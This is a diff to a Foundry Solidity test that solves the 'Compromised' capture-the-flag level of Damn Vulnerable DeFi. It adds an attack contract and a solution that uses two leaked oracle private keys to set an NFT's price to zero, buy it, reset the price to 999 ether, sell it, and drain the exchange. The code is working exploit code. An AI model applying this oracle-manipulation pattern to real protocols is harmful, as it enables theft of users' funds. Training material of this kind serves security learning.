@@ -9,6 +9,41 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract AttackCompromised is IERC721Receiver {
+    TrustfulOracle private immutable oracle;
+    Exchange private immutable exchange;
+    DamnValuableNFT private immutable nft;
+    address private immutable recovery;
+    uint256 private nftId;
+
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function buy() external payable {
+        nftId = exchange.buyOne{value: 1}();
+    }
+
+    function sell() external payable {
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint256 amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -19,7 +54,6 @@ contract CompromisedChallenge is Test {
     uint256 constant INITIAL_NFT_PRICE = 999 ether;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
-
 
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
@@ -75,7 +109,28 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Private keys from decoded HTTP response
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        // Get source addresses
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+        // Deploy attack contract
+        AttackCompromised attackContract =
+            new AttackCompromised{value: address(this).balance}(oracle, exchange, nft, recovery);
+        // Set price to 0 and buy
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 0);
+        attackContract.buy();
+        // Set price to 999 ETH and sell
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 999 ether);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 999 ether);
+        attackContract.sell();
+        attackContract.recover(999 ether);
     }
 
     /**
